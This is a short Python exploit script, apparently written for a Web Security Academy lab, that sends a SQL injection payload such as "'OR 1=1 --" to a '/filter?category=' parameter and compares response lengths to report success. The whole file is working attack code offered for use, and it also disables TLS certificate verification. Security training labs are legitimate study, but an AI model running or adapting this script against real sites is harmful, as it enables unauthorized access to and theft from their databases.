#!/usr/bin/env python3

import requests
import sys
import urllib3

# Disable SSL warnings for non-SSL connections
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_content_length(url, payload, proxies):
    uri = '/filter?category='
    normal_response = requests.get(url + uri + "Gifts", verify=False, proxies=proxies)
    injected_response = requests.get(url + uri + payload, verify=False, proxies=proxies)
    
    # Comparing the content response length
    if len(injected_response.text) > len(normal_response.text):
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        # Collecting URL and payload from command-line arguments
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        
        # Initializing proxies as None in case -x is not provided
        proxies = None

        # Check if the proxy argument is passed
        if '-x' in sys.argv:
            proxy_index = sys.argv.index('-x') + 1
            proxy = sys.argv[proxy_index].strip()
            # Setup the proxies dictionary for HTTP and HTTPS
            proxies = {'http': proxy, 'https': proxy}

    except IndexError:
        # Print usage if not enough arguments are supplied
        print('[-] Usage: %s <url> <payload> [-x <proxy>]' % sys.argv[0])
        print('[-] Example: %s https://0a72000b03fc80ea8bc0de2b003c00ca.web-security-academy.net "\'OR 1=1 --"' % sys.argv[0])
        sys.exit(-1)

    # Perform the SQL injection attempt and print results
    if exploit_sqli_content_length(url, payload, proxies):
        # Print success message in green
        print("\033[92m[+] SQL injected successfully :) \033[0m")
    else:
        # Print failure message in red
        print("\033[91m[-] SQL injection failed :( \033[0m")
